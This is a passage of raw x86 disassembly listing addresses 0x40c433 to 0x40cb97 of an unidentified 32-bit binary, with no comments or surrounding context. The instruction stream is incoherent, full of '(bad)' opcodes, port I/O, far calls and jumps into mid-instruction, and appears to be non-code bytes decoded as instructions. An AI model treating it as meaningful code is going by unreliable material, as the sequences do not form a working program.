  40c433:	test   BYTE PTR [ecx+edi*2+0x44d55b20],dl
  40c43a:	or     cl,BYTE PTR [esi-0x226cca9f]
  40c440:	in     eax,0xb
  40c442:	imul   ebp,DWORD PTR [eax],0x7e3213b6
  40c448:	fdiv   QWORD PTR [ebp-0xf4b053d]
  40c44e:	sbb    eax,0xe5b64a42
  40c453:	mov    al,ds:0xee906f18
  40c458:	adc    eax,ebx
  40c45a:	and    DWORD PTR [edi+0x3732b45c],esi
  40c460:	push   ebp
  40c461:	mov    bl,0x5d
  40c463:	out    0x79,al
  40c465:	xchg   DWORD PTR [ebx+0x60129e1a],esp
  40c46b:	xchg   ebx,eax
  40c46c:	pop    eax
  40c46d:	pushf  
  40c46e:	mov    al,0x6e
  40c470:	adc    ah,BYTE PTR [ebx-0x2ea8d3d7]
  40c476:	daa    
  40c477:	call   0x80e7:0x635164dc
  40c47e:	fs sub cl,BYTE PTR ss:[eax]
  40c482:	idiv   DWORD PTR [edx-0x19]
  40c485:	dec    eax
  40c486:	mov    bl,0xdc
  40c488:	imul   esi,DWORD PTR [esi-0x3c],0xdf375051
  40c48f:	sbb    al,0x94
  40c491:	icebp  
  40c492:	sub    DWORD PTR [eax+0xc],esi
  40c495:	leave  
  40c496:	sbb    DWORD PTR ds:0x41efa59,ebx
  40c49c:	mov    ch,0x84
  40c49e:	in     al,0x8a
  40c4a0:	fmul   DWORD PTR [edi-0x7a]
  40c4a3:	push   esi
  40c4a4:	pop    eax
  40c4a5:	dec    ebp
  40c4a6:	sub    bh,BYTE PTR [edx+0x2d3600c4]
  40c4ac:	fucomi st,st(4)
  40c4ae:	jno    0x40c430
  40c4b0:	hlt    
  40c4b1:	ins    BYTE PTR es:[edi],dx
  40c4b2:	push   ds
  40c4b3:	push   0x76
  40c4b5:	mov    cs,WORD PTR [ebx+0x79a15cb2]
  40c4bb:	xchg   esp,eax
  40c4bc:	pop    edi
  40c4bd:	jmp    0x40c4f9
  40c4bf:	inc    si
  40c4c1:	cmp    al,0xb3
  40c4c3:	ja     0x40c4df
  40c4c5:	(bad)  
  40c4c6:	mov    bh,0x16
  40c4c8:	xchg   ecx,ebp
  40c4ca:	mov    es,WORD PTR [edi-0x47]
  40c4cd:	push   edx
  40c4ce:	sbb    ch,BYTE PTR [edi+0x34]
  40c4d1:	bound  ebp,QWORD PTR [ebx]
  40c4d3:	das    
  40c4d4:	mov    bl,0x8a
  40c4d6:	cmp    DWORD PTR [eax+0x3b],eax
  40c4d9:	dec    edi
  40c4da:	inc    edx
  40c4db:	jb     0x40c52e
  40c4dd:	xchg   ebx,eax
  40c4de:	jecxz  0x40c4f5
  40c4e0:	(bad)  
  40c4e1:	in     al,0x54
  40c4e3:	jecxz  0x40c555
  40c4e5:	sbb    ecx,0x79
  40c4e8:	in     al,0xc7
  40c4ea:	inc    eax
  40c4eb:	xchg   DWORD PTR [eax+ebx*4],edi
  40c4ee:	mov    ah,0x77
  40c4f0:	mov    ?,WORD PTR [ecx+0x66]
  40c4f3:	repz data16 fcom st(2)
  40c4f7:	inc    edi
  40c4f8:	fld    TBYTE PTR [ecx-0x47]
  40c4fb:	dec    esp
  40c4fc:	push   ebx
  40c4fd:	or     esp,DWORD PTR [esi+0x38698001]
  40c503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c504:	stc    
  40c505:	stos   DWORD PTR es:[edi],eax
  40c506:	jl     0x40c55f
  40c508:	cmp    dl,BYTE PTR [eax-0x3f]
  40c50b:	push   eax
  40c50c:	(bad)
  40c510:	scas   al,BYTE PTR es:[edi]
  40c511:	inc    esi
  40c512:	clc    
  40c513:	dec    eax
  40c514:	enter  0x3f01,0x93
  40c518:	or     BYTE PTR [ebx-0x13],dh
  40c51b:	pop    ebp
  40c51c:	pop    esi
  40c51d:	or     ch,BYTE PTR [edx+0x2e745b17]
  40c523:	xchg   DWORD PTR [ecx+0x3d222c3],ecx
  40c529:	bound  ecx,QWORD PTR [eax]
  40c52b:	in     al,0x91
  40c52d:	aaa    
  40c52e:	lods   al,BYTE PTR ds:[esi]
  40c52f:	test   DWORD PTR [ebp-0x3c],ebp
  40c532:	dec    ebx
  40c533:	or     BYTE PTR [edi+edx*8],ah
  40c536:	popa   
  40c537:	outs   dx,BYTE PTR ds:[esi]
  40c538:	cmp    dl,BYTE PTR [eax+0x55b3dceb]
  40c53e:	loopne 0x40c51c
  40c540:	aam    0xb1
  40c542:	sub    BYTE PTR [esi+0x3eeb3023],0xee
  40c549:	mov    gs,WORD PTR [ebx+0x15450d2e]
  40c54f:	xor    DWORD PTR gs:[edi],eax
  40c552:	mov    ch,BYTE PTR [ebx]
  40c554:	(bad)  
  40c555:	pop    edx
  40c556:	test   eax,0x1ba898bd
  40c55b:	add    edx,DWORD PTR [edi+0x9]
  40c55e:	fcmovne st,st(1)
  40c560:	xor    ah,dl
  40c562:	or     eax,0x48473f47
  40c567:	jae    0x40c5d8
  40c569:	cmp    BYTE PTR [edi+0xf5a28b],al
  40c56f:	push   es
  40c570:	sbb    DWORD PTR [esi],ebx
  40c572:	loope  0x40c57b
  40c574:	lods   al,BYTE PTR ds:[esi]
  40c575:	mov    edx,0xb8c5588a
  40c57a:	iret   
  40c57b:	add    ch,ch
  40c57d:	js     0x40c570
  40c57f:	out    0x3e,al
  40c581:	mov    bl,0x84
  40c583:	sar    BYTE PTR [ecx-0x754f9f69],0x4a
  40c58a:	inc    ecx
  40c58b:	mov    ch,0xe8
  40c58d:	fsubr  DWORD PTR [edx]
  40c58f:	xor    ebx,ecx
  40c591:	push   ebx
  40c592:	mov    ebp,0x716b4fd4
  40c597:	mov    esi,0xf8324e08
  40c59c:	ficomp DWORD PTR [edi+0x35]
  40c59f:	or     esp,DWORD PTR [edx]
  40c5a1:	ret    0x6a71
  40c5a4:	pop    ebp
  40c5a5:	aaa    
  40c5a6:	aaa    
  40c5a7:	jle    0x40c594
  40c5a9:	inc    edx
  40c5aa:	add    al,0xe7
  40c5ac:	mov    DWORD PTR [edx+0x3c865360],ebp
  40c5b2:	push   eax
  40c5b3:	push   0xc8a7c5f
  40c5b8:	int3   
  40c5b9:	mov    ch,0x67
  40c5bb:	mov    ebx,gs
  40c5bd:	mov    ecx,0x8faa49bb
  40c5c2:	jno    0x40c5db
  40c5c4:	addr16 leave 
  40c5c6:	add    dh,BYTE PTR [ebp+edx*8+0x4d]
  40c5ca:	cs adc ebx,esp
  40c5cd:	or     DWORD PTR [ebp+0xdfa5049],ebx
  40c5d3:	test   BYTE PTR [esi],dh
  40c5d5:	jb     0x40c5a1
  40c5d7:	dec    edi
  40c5d8:	popa   
  40c5d9:	inc    eax
  40c5da:	(bad)  
  40c5db:	xor    dh,BYTE PTR [ecx+0x7c]
  40c5de:	jge    0x40c655
  40c5e0:	sar    DWORD PTR ds:[ebx],cl
  40c5e3:	retf   
  40c5e4:	aas    
  40c5e5:	mov    edx,DWORD PTR [edi]
  40c5e7:	call   0xbae5783
  40c5ec:	inc    eax
  40c5ed:	repnz shl BYTE PTR [esi-0x1b],cl
  40c5f1:	popf   
  40c5f2:	imul   ecx,ebp,0x61
  40c5f5:	nop
  40c5f6:	sar    BYTE PTR [esi-0x31b15d11],1
  40c5fc:	dec    ecx
  40c5fd:	or     edi,ebp
  40c5ff:	sbb    al,0x85
  40c602:	inc    esp
  40c603:	fiadd  DWORD PTR [edx]
  40c605:	test   BYTE PTR [ebx-0x68],bl
  40c608:	aam    0x7c
  40c60a:	inc    edi
  40c60b:	sbb    al,0xf4
  40c60d:	push   edx
  40c60e:	or     eax,0x6873bc48
  40c613:	dec    ebx
  40c614:	scas   al,BYTE PTR es:[edi]
  40c615:	not    cl
  40c617:	pop    edx
  40c618:	sub    BYTE PTR [ecx+esi*1],al
  40c61b:	pop    ecx
  40c61c:	and    DWORD PTR [edx-0x643711a1],ebp
  40c622:	xchg   esp,eax
  40c623:	or     DWORD PTR [ebx-0x51a00085],0xbbbda9b2
  40c62d:	aas    
  40c62e:	(bad)  
  40c62f:	arpl   sp,si
  40c631:	sub    al,0x4c
  40c633:	call   0x3d61:0xdf2cc8c4
  40c63a:	popa   
  40c63b:	or     dh,cl
  40c63d:	int3   
  40c63e:	lea    edx,[ecx]
  40c640:	das    
  40c641:	mov    eax,ds:0x48d4bb89
  40c646:	(bad)  
  40c647:	icebp  
  40c648:	fisubr DWORD PTR ss:[ebx+0x5f]
  40c64c:	jge    0x40c64e
  40c64e:	push   0x38
  40c650:	jp     0x40c665
  40c652:	pop    ecx
  40c653:	and    DWORD PTR [eax],ebp
  40c655:	adc    esp,DWORD PTR [edi]
  40c657:	pop    eax
  40c658:	stos   BYTE PTR es:[edi],al
  40c659:	cmp    bl,bl
  40c65b:	out    0xa3,al
  40c65d:	(bad)  
  40c65e:	test   al,0x3b
  40c660:	ins    DWORD PTR es:[edi],dx
  40c661:	or     eax,0xdbabbcaf
  40c666:	xor    ch,al
  40c668:	movnti DWORD PTR [edi],ebp
  40c66b:	cld    
  40c66c:	sbb    eax,0x6dd9f304
  40c671:	sbb    bl,dl
  40c673:	xchg   bl,ah
  40c675:	bnd jns 0x40c6dc
  40c678:	push   edx
  40c679:	cmp    BYTE PTR [ebp+0x6dcd84cb],dh
  40c67f:	aaa    
  40c680:	test   DWORD PTR [edx],esi
  40c682:	data16 mov dh,0x75
  40c685:	nop
  40c686:	pop    ecx
  40c687:	cwde   
  40c688:	in     al,0x2
  40c68a:	cmp    dh,BYTE PTR [esi+0x7d]
  40c68d:	cdq    
  40c68e:	mov    ds:0x34448636,eax
  40c693:	dec    ecx
  40c694:	mov    eax,ds:0xbd5bfabd
  40c699:	sbb    ch,BYTE PTR [eax+0x3e]
  40c69c:	sub    BYTE PTR [ebx-0x78],0x41
  40c6a0:	mov    bl,0xad
  40c6a2:	sbb    BYTE PTR [eax+edi*8+0x460a4ace],al
  40c6a9:	add    BYTE PTR [edi+0x5dc2dc12],bl
  40c6af:	fnstcw WORD PTR gs:[esi]
  40c6b2:	inc    edi
  40c6b3:	pop    ecx
  40c6b4:	je     0x40c663
  40c6b6:	pop    ebx
  40c6b7:	call   0x703f:0x3fe467a1
  40c6be:	and    DWORD PTR [edi],ebx
  40c6c0:	sbb    ecx,DWORD PTR [edi]
  40c6c2:	(bad)  
  40c6c3:	int3   
  40c6c4:	xchg   esp,eax
  40c6c5:	std    
  40c6c6:	loop   0x40c689
  40c6c8:	cmp    al,0x62
  40c6ca:	xchg   ebp,eax
  40c6cb:	mov    al,0x5d
  40c6cd:	cli    
  40c6ce:	or     al,0xcf
  40c6d0:	mov    esp,0x2474446f
  40c6d5:	fiadd  WORD PTR [esi-0x3b]
  40c6d8:	push   edx
  40c6d9:	pushf  
  40c6da:	(bad)  
  40c6dc:	(bad)  
  40c6dd:	lods   eax,DWORD PTR ds:[esi]
  40c6de:	ror    DWORD PTR [ecx-0x9],0xd3
  40c6e2:	xor    eax,DWORD PTR [eax+0x49]
  40c6e5:	das    
  40c6e6:	daa    
  40c6e7:	outs   dx,DWORD PTR ds:[esi]
  40c6e8:	stos   DWORD PTR es:[edi],eax
  40c6e9:	jbe    0x40c6b9
  40c6eb:	int3   
  40c6ec:	sbb    DWORD PTR [ebx+esi*1+0x4c],ebx
  40c6f0:	sar    DWORD PTR ss:[edi-0x238609b0],0x20
  40c6f8:	scas   al,BYTE PTR es:[edi]
  40c6f9:	or     DWORD PTR [ebx-0x33],ebx
  40c6fc:	jle    0x40c74e
  40c6fe:	add    al,BYTE PTR [edi+0x31]
  40c701:	fs stos BYTE PTR es:[edi],al
  40c703:	add    cl,BYTE PTR [ebx+0x59bb56fd]
  40c709:	rcl    DWORD PTR [esi],1
  40c70b:	xchg   ebp,eax
  40c70c:	adc    eax,0xc61db42c
  40c711:	mov    ch,0xc1
  40c713:	mov    bh,0x63
  40c715:	mov    bh,0x9c
  40c717:	xor    al,0xfa
  40c719:	leave  
  40c71a:	stc    
  40c71b:	in     eax,0x35
  40c71d:	lock bound ecx,QWORD PTR [edx+0x19]
  40c721:	in     eax,0x10
  40c723:	fwait
  40c724:	call   DWORD PTR [esi+0x6e7fb9c5]
  40c72a:	jmp    0xabb3:0x8d39e493
  40c731:	xchg   edx,eax
  40c732:	sbb    edi,edx
  40c734:	cmp    al,0xb7
  40c736:	or     DWORD PTR [eax+0x7d61f425],eax
  40c73c:	cwde   
  40c73d:	ret    
  40c73e:	dec    esi
  40c73f:	xchg   BYTE PTR [ecx+ebx*2],bl
  40c742:	adc    ah,BYTE PTR [ebx]
  40c744:	adc    DWORD PTR [esi+0x328d0451],esi
  40c74a:	pop    esp
  40c74b:	setb   bl
  40c74e:	mov    cl,0xa5
  40c750:	(bad)  
  40c751:	out    0x52,al
  40c753:	dec    ecx
  40c754:	iret   
  40c755:	dec    esi
  40c756:	outs   dx,BYTE PTR ds:[esi]
  40c757:	mov    BYTE PTR [esi+edi*1-0x6601746e],0x17
  40c75f:	push   cs
  40c760:	inc    esi
  40c761:	sbb    eax,0x8d9c757f
  40c766:	cmc    
  40c767:	inc    esi
  40c768:	ret    
  40c769:	xchg   esi,eax
  40c76a:	or     bl,bh
  40c76c:	adc    DWORD PTR [ecx-0x13],ebp
  40c76f:	cmp    cl,dl
  40c771:	jecxz  0x40c7ac
  40c773:	cdq    
  40c774:	dec    edi
  40c775:	cmp    edx,DWORD PTR fs:[ebp+0x15]
  40c779:	fs nop
  40c77b:	ja     0x40c7e6
  40c77d:	mov    dl,0xb5
  40c77f:	dec    ebx
  40c781:	push   0x93a060a1
  40c786:	jnp    0x40c711
  40c788:	cmp    esp,DWORD PTR [eax+0x5776055c]
  40c78e:	fstp   QWORD PTR [edi]
  40c790:	push   ecx
  40c791:	mov    dh,0x24
  40c793:	(bad)  
  40c794:	push   ds
  40c795:	mov    cl,0x16
  40c797:	and    eax,0xa009e2a6
  40c79c:	lods   eax,DWORD PTR ds:[esi]
  40c79d:	and    DWORD PTR [ecx-0x26],ebp
  40c7a0:	ss mov esi,0xc9dcbcf3
  40c7a6:	outs   dx,DWORD PTR ds:[esi]
  40c7a7:	int    0xf0
  40c7a9:	push   esp
  40c7aa:	pop    edi
  40c7ab:	cmp    eax,0x3051f086
  40c7b0:	jmp    0x40c79c
  40c7b2:	or     al,0xcf
  40c7b4:	(bad)  
  40c7b5:	lock cwde 
  40c7b7:	call   0x6c40037
  40c7bc:	out    0x34,eax
  40c7be:	sbb    eax,0x8666b159
  40c7c3:	fld    QWORD PTR [edx]
  40c7c5:	cld    
  40c7c6:	mov    WORD PTR [edx-0x50],gs
  40c7c9:	add    bh,dl
  40c7cb:	js     0x40c842
  40c7cd:	pop    eax
  40c7ce:	rcr    BYTE PTR [ebp-0x338fef31],0xed
  40c7d5:	sub    al,0x22
  40c7d7:	cmp    esp,DWORD PTR [edx-0x4b]
  40c7da:	cs loope 0x40c7fd
  40c7dd:	xchg   eax,edx
  40c7df:	add    BYTE PTR [ecx+eiz*8-0x66567fda],al
  40c7e6:	test   eax,0xe3c939db
  40c7eb:	cmc    
  40c7ec:	lods   eax,DWORD PTR ds:[esi]
  40c7ed:	or     BYTE PTR [edx+0x20],dl
  40c7f0:	mov    dl,cl
  40c7f2:	push   ebp
  40c7f3:	mov    esi,0x37143eb1
  40c7f8:	pusha  
  40c7f9:	arpl   WORD PTR [ebx],bx
  40c7fb:	ret    
  40c7fc:	rol    DWORD PTR [eax+edx*4+0x28],1
  40c800:	stc    
  40c801:	or     al,BYTE PTR [eax-0x59]
  40c804:	nop
  40c805:	out    0xa8,eax
  40c807:	dec    esi
  40c808:	pushf  
  40c809:	sti    
  40c80a:	mov    ebp,0xed3fecc0
  40c80f:	(bad)  [eax]
  40c811:	dec    ebp
  40c812:	jne    0x40c827
  40c814:	imul   eax,DWORD PTR [ebx-0x20],0xe23ec564
  40c81b:	xor    BYTE PTR [ebx+0x59885798],ah
  40c821:	(bad)
  40c824:	aad    0xdd
  40c826:	pop    ebp
  40c827:	mov    dh,0x19
  40c829:	dec    ebx
  40c82a:	fs dec esi
  40c82c:	cmc    
  40c82d:	imul   edi,DWORD PTR [edx+0x21],0x90d97668
  40c834:	mov    ebx,0xd698daab
  40c839:	jl     0x40c80b
  40c83b:	ret    
  40c83c:	pusha  
  40c83d:	in     eax,0x6
  40c83f:	cmp    BYTE PTR [edx+eiz*4+0x7f6453ac],al
  40c846:	jb     0x40c828
  40c848:	inc    ebx
  40c849:	mov    ebp,0x89f0d57d
  40c84e:	cs jecxz 0x40c8b6
  40c851:	lock dec ecx
  40c853:	or     DWORD PTR [eax+0x4a0d9a48],ebx
  40c859:	ds cwde 
  40c85b:	sub    al,0xa3
  40c85d:	and    ebp,DWORD PTR [eax]
  40c85f:	push   edx
  40c860:	push   ds
  40c861:	adc    eax,DWORD PTR [ebx+0xe]
  40c864:	popa   
  40c865:	mov    ah,0x2
  40c867:	aas    
  40c868:	mov    ebp,0xd8f9ec75
  40c86d:	imul   ecx,ebx,0xfee001f7
  40c873:	stos   DWORD PTR es:[edi],eax
  40c874:	fnsave [ebp-0x46cb3e29]
  40c87a:	sub    ah,al
  40c87c:	xchg   DWORD PTR [edi],ebx
  40c87e:	pop    ebp
  40c87f:	sub    dl,BYTE PTR [edx]
  40c881:	out    0xda,eax
  40c883:	stos   BYTE PTR es:[edi],al
  40c884:	fucomp st(3)
  40c886:	fisttp DWORD PTR [ecx]
  40c888:	jne    0x40c89f
  40c88a:	adc    bh,BYTE PTR [edi]
  40c88c:	inc    ebx
  40c88d:	push   ebx
  40c88e:	lock in al,dx
  40c890:	sti    
  40c891:	jo     0x40c906
  40c893:	retf   0xddf3
  40c896:	test   BYTE PTR [esi],cl
  40c898:	loopne 0x40c875
  40c89a:	sbb    DWORD PTR [ebx+0x1f],eax
  40c89d:	jge    0x40c855
  40c89f:	mov    dh,0xca
  40c8a1:	cmp    bh,bh
  40c8a3:	scas   eax,DWORD PTR es:[edi]
  40c8a4:	iret   
  40c8a5:	in     al,dx
  40c8a6:	sbb    eax,0xfdb1286e
  40c8ab:	into   
  40c8ac:	pop    ss
  40c8ad:	push   0x32
  40c8af:	idiv   DWORD PTR [edi-0x7bd24360]
  40c8b5:	jl     0x40c8d6
  40c8b7:	mov    esp,0x1e3151fd
  40c8bc:	loop   0x40c8b4
  40c8be:	repnz sbb BYTE PTR [eax+0x6b],ch
  40c8c2:	pop    edi
  40c8c3:	(bad)  
  40c8c4:	mov    ds:0xdd14c2e5,al
  40c8c9:	sub    eax,0xc74e8ee6
  40c8ce:	aas    
  40c8cf:	(bad)
  40c8d2:	or     esi,DWORD PTR [ecx+0x38296c25]
  40c8d8:	pop    edi
  40c8d9:	xor    edi,DWORD PTR [eax+ecx*8+0x75c2955c]
  40c8e0:	jmp    0x40c894
  40c8e2:	dec    edi
  40c8e3:	ins    BYTE PTR es:[edi],dx
  40c8e4:	fistp  WORD PTR [ebx]
  40c8e6:	pushaw 
  40c8e8:	pop    ss
  40c8e9:	fwait
  40c8ea:	in     al,dx
  40c8eb:	nop
  40c8ec:	jp     0x40c91a
  40c8ee:	push   ebp
  40c8ef:	outs   dx,BYTE PTR ds:[esi]
  40c8f0:	dec    ebx
  40c8f1:	mov    cl,0x35
  40c8f3:	into   
  40c8f4:	dec    ebx
  40c8f5:	cli    
  40c8f6:	scas   eax,DWORD PTR es:[edi]
  40c8f7:	les    ebx,FWORD PTR [eax+0x59]
  40c8fa:	adc    BYTE PTR [eax],ch
  40c8fc:	sub    BYTE PTR [ebp-0xd],ch
  40c8ff:	clc    
  40c900:	call   0x418b69bb
  40c905:	inc    edx
  40c906:	js     0x40c932
  40c908:	sbb    al,BYTE PTR [ecx+0x19]
  40c90b:	shr    DWORD PTR [edi+0x49],1
  40c90e:	icebp  
  40c90f:	adc    eax,0x921924aa
  40c914:	gs dec ebx
  40c916:	fbld   TBYTE PTR [edx]
  40c918:	or     edx,DWORD PTR [eax+0x4c4f3cf4]
  40c91e:	inc    esi
  40c91f:	call   0x15a51dc3
  40c924:	mov    al,0x78
  40c926:	or     DWORD PTR [edi-0x1b],edx
  40c929:	lock fdiv QWORD PTR [ebp-0x58ef8d7b]
  40c930:	sbb    DWORD PTR [ebx-0xa7f6d21],esp
  40c936:	sbb    ebx,edi
  40c938:	aaa    
  40c939:	ins    DWORD PTR es:[edi],dx
  40c93a:	mov    ah,0x20
  40c93c:	cmc    
  40c93d:	lods   al,BYTE PTR ds:[esi]
  40c93e:	aaa    
  40c93f:	mov    bl,0x82
  40c941:	enter  0x732c,0xe
  40c945:	mov    fs,ecx
  40c947:	lods   eax,DWORD PTR ds:[esi]
  40c948:	in     al,0x4c
  40c94a:	iret   
  40c94b:	and    esp,DWORD PTR [ebx-0x12a4b906]
  40c951:	push   ebx
  40c952:	pop    es
  40c953:	shr    BYTE PTR [eax+0x13],1
  40c956:	std    
  40c957:	nop
  40c958:	fwait
  40c959:	(bad)  
  40c95a:	jns    0x40c9d7
  40c95c:	fimul  WORD PTR [ecx-0x2a791358]
  40c962:	pop    ebp
  40c963:	sub    al,dl
  40c965:	ins    BYTE PTR es:[edi],dx
  40c966:	mov    edi,0x6acea888
  40c96b:	sbb    ch,BYTE PTR [esi]
  40c96d:	cmp    esp,edx
  40c96f:	ins    DWORD PTR es:[edi],dx
  40c970:	jne    0x40c971
  40c972:	imul   edi,DWORD PTR [edi],0xffffffa3
  40c975:	sbb    al,al
  40c977:	sbb    ah,BYTE PTR [ecx-0x2]
  40c97a:	mov    bh,0x4e
  40c97c:	jo     0x40c999
  40c97e:	cld    
  40c97f:	pop    ds
  40c980:	rcr    DWORD PTR [ecx],1
  40c982:	out    dx,eax
  40c983:	mov    ebp,0x32164b29
  40c988:	push   esi
  40c989:	xchg   BYTE PTR [ebx-0xf2154a2],ah
  40c98f:	shr    DWORD PTR [ebp+edi*8-0x6a],1
  40c993:	addr16 dec esp
  40c995:	fsubr  DWORD PTR ds:0x96a07298
  40c99b:	loope  0x40c9bb
  40c99d:	cli    
  40c99e:	dec    ebp
  40c99f:	jno    0x40ca02
  40c9a1:	fsubr  DWORD PTR ds:0xfe5f80cc
  40c9a7:	ins    DWORD PTR es:[edi],dx
  40c9a8:	adc    ah,bh
  40c9aa:	inc    ebp
  40c9ab:	mov    esp,DWORD PTR [ecx+eax*8-0xf]
  40c9af:	add    BYTE PTR [eax+eax*2],ch
  40c9b2:	sbb    ah,al
  40c9b4:	sbb    al,0x9b
  40c9b6:	add    ah,BYTE PTR [esi-0x7b]
  40c9b9:	or     eax,0xcbef18e5
  40c9be:	jecxz  0x40c9fc
  40c9c0:	nop
  40c9c1:	mov    al,ds:0x7108f9e0
  40c9c6:	(bad)  
  40c9c8:	gs loopne 0x40c98d
  40c9cb:	lock aad 0xa7
  40c9ce:	mov    esi,0xb82621c8
  40c9d3:	ds das 
  40c9d5:	cli    
  40c9d6:	xor    BYTE PTR [edi-0x4f],bh
  40c9d9:	xor    BYTE PTR [ebx],ch
  40c9db:	xchg   ecx,eax
  40c9dc:	add    ah,0xeb
  40c9df:	addr16 pop ebp
  40c9e1:	mov    dh,0x75
  40c9e3:	fst    DWORD PTR [esi-0x6a71684d]
  40c9e9:	push   es
  40c9ea:	hlt    
  40c9eb:	sub    eax,0x6cc138fb
  40c9f0:	ins    BYTE PTR es:[edi],dx
  40c9f1:	es and al,0xf2
  40c9f4:	and    edi,DWORD PTR [edx-0x8]
  40c9f7:	in     al,dx
  40c9f8:	cmp    esp,ebx
  40c9fa:	cmp    eax,0x7fec45a7
  40c9ff:	xlat   BYTE PTR ds:[ebx]
  40ca00:	push   cs
  40ca01:	int    0x23
  40ca03:	or     al,0x1e
  40ca05:	es fs and al,0x8
  40ca09:	jecxz  0x40ca62
  40ca0b:	xchg   esi,eax
  40ca0c:	jbe    0x40ca4f
  40ca0e:	push   ebp
  40ca0f:	xlat   BYTE PTR ds:[ebx]
  40ca10:	sub    bh,BYTE PTR [ecx+edi*2]
  40ca13:	cmp    DWORD PTR [edi+0x4c],0x64
  40ca17:	sub    al,0x1f
  40ca19:	xor    eax,0x974314d0
  40ca1e:	pop    edi
  40ca1f:	into   
  40ca20:	push   es
  40ca21:	scas   al,BYTE PTR es:[edi]
  40ca22:	pop    esi
  40ca23:	sub    BYTE PTR [ebx],0xba
  40ca26:	les    edx,FWORD PTR [edi-0x332de08c]
  40ca2c:	call   0x396:0x12c11795
  40ca33:	mov    cl,0xa
  40ca35:	enter  0xca3f,0xef
  40ca39:	je     0x40ca98
  40ca3b:	daa    
  40ca3c:	in     al,0x83
  40ca3e:	pop    ecx
  40ca3f:	push   es
  40ca40:	inc    eax
  40ca41:	and    esi,DWORD PTR [edi+0x308c7608]
  40ca47:	lea    ebx,[ebx]
  40ca49:	push   edx
  40ca4a:	push   esi
  40ca4b:	stc    
  40ca4c:	jge    0x40cab0
  40ca4e:	xor    BYTE PTR [edi+0x28],dl
  40ca51:	scas   al,BYTE PTR es:[edi]
  40ca52:	mov    dl,0xf2
  40ca54:	jo     0x40ca06
  40ca56:	clc    
  40ca57:	jp     0x40ca67
  40ca59:	clc    
  40ca5a:	test   al,0x3
  40ca5c:	add    ah,al
  40ca5e:	and    esi,DWORD PTR [ebx+0xac229e8]
  40ca64:	push   edx
  40ca65:	ss mov ebx,0xea562de9
  40ca6b:	mov    ch,0x66
  40ca6d:	jecxz  0x40ca44
  40ca6f:	cs stc 
  40ca71:	aad    0xeb
  40ca73:	jmp    0x7368:0x5446263a
  40ca7a:	push   ss
  40ca7b:	dec    eax
  40ca7c:	pop    ebp
  40ca7d:	xchg   ah,al
  40ca7f:	and    bl,BYTE PTR [ebp+0x13f0b102]
  40ca85:	ret    
  40ca86:	sub    DWORD PTR [eax-0x4706633],eax
  40ca8c:	cli    
  40ca8d:	dec    ebx
  40ca8e:	sar    bh,cl
  40ca90:	jmp    0xe9115202
  40ca95:	sub    BYTE PTR [edx],al
  40ca97:	dec    edi
  40ca98:	push   0xd6ca47e3
  40ca9d:	out    0x1,eax
  40ca9f:	xor    al,0x9c
  40caa1:	xor    esi,DWORD PTR [esi]
  40caa3:	pop    ecx
  40caa4:	cdq    
  40caa5:	mov    BYTE PTR [eax+0x7],bl
  40caa8:	sbb    edi,DWORD PTR [eax+0x4190e835]
  40caae:	leave  
  40caaf:	and    bl,ah
  40cab1:	mov    ecx,0x7b2c11db
  40cab6:	mov    ds:0xbcfb8e82,eax
  40cabb:	call   0x4362:0xafc8dac4
  40cac2:	push   esi
  40cac3:	mov    dl,0x50
  40cac5:	lds    edi,FWORD PTR [esi+0x6422bef1]
  40cacb:	lahf   
  40cacc:	sahf   
  40cacd:	in     eax,dx
  40cace:	fisttp DWORD PTR [edi]
  40cad0:	pop    ebp
  40cad1:	shl    BYTE PTR [esi],1
  40cad3:	call   0x393c:0xe6ab3fb
  40cada:	xor    ebx,DWORD PTR [edi-0x107c38a8]
  40cae0:	cwde   
  40cae1:	lods   al,BYTE PTR ds:[esi]
  40cae2:	and    eax,0x26bbf0ad
  40cae7:	mov    dh,BYTE PTR [eax-0x2782b684]
  40caed:	std    
  40caee:	mov    BYTE PTR [edx],bh
  40caf0:	pusha  
  40caf1:	push   0xffffff88
  40caf3:	and    al,0xb9
  40caf5:	(bad)  
  40caf6:	dec    eax
  40caf7:	xor    al,0x4
  40caf9:	push   ds
  40cafa:	push   edi
  40cafb:	mov    al,0x38
  40cafd:	or     DWORD PTR [eax+0x48],0x20a1a369
  40cb04:	repnz sahf 
  40cb06:	std    
  40cb07:	pop    esi
  40cb08:	dec    eax
  40cb09:	out    0xa7,eax
  40cb0b:	inc    eax
  40cb0c:	push   es
  40cb0d:	into   
  40cb0e:	pop    es
  40cb0f:	mov    ebx,DWORD PTR [edx-0x6c]
  40cb12:	shr    esp,1
  40cb14:	ror    BYTE PTR [edx-0x2a],0xef
  40cb18:	cli    
  40cb19:	or     BYTE PTR [ecx],bh
  40cb1b:	xlat   BYTE PTR ds:[ebx]
  40cb1c:	inc    ebp
  40cb1d:	sbb    BYTE PTR [ebp+0x54],bl
  40cb20:	jmp    0xbe28a984
  40cb25:	int3   
  40cb26:	repz add bl,BYTE PTR [eax-0x57f1deeb]
  40cb2d:	cmp    eax,0x71d10153
  40cb32:	jl     0x40cae7
  40cb34:	call   0x98f90fb4
  40cb39:	mov    esp,0x87fc1549
  40cb3e:	lods   eax,DWORD PTR ds:[esi]
  40cb3f:	nop
  40cb40:	jnp    0x40cb6c
  40cb42:	hlt    
  40cb43:	cwde   
  40cb44:	lock or bh,BYTE PTR [edi+edx*1+0x6172501a]
  40cb4c:	mov    eax,ds:0x11bf6e61
  40cb51:	push   0xf4a8d79f
  40cb56:	iret   
  40cb57:	mov    bh,BYTE PTR [ebx-0x7059092d]
  40cb5d:	(bad)  
  40cb5e:	fnstcw WORD PTR [ecx+0x4d]
  40cb61:	ror    esi,cl
  40cb63:	pushf  
  40cb64:	fcmovne st,st(1)
  40cb66:	pop    ebp
  40cb67:	call   0xaca14416
  40cb6c:	inc    eax
  40cb6d:	shr    DWORD PTR cs:0xa0db9ef3,cl
  40cb74:	xchg   ebx,eax
  40cb75:	aad    0x13
  40cb77:	outs   dx,BYTE PTR ds:[esi]
  40cb78:	clc    
  40cb79:	dec    ebp
  40cb7a:	enter  0xdb23,0x84
  40cb7e:	ret    
  40cb7f:	sub    al,0x3
  40cb81:	or     bl,BYTE PTR [eax+0x71]
  40cb84:	mov    esp,DWORD PTR [edi]
  40cb86:	cmc    
  40cb87:	push   ds
  40cb88:	int3   
  40cb89:	mov    ah,BYTE PTR [edi-0x29f07a37]
  40cb8f:	stc    
  40cb90:	loopne 0x40cb33
  40cb92:	push   ss
  40cb93:	and    BYTE PTR [ebp+0x60],0xa
  40cb97:	lods   al,BYTE PTR ds:[esi]
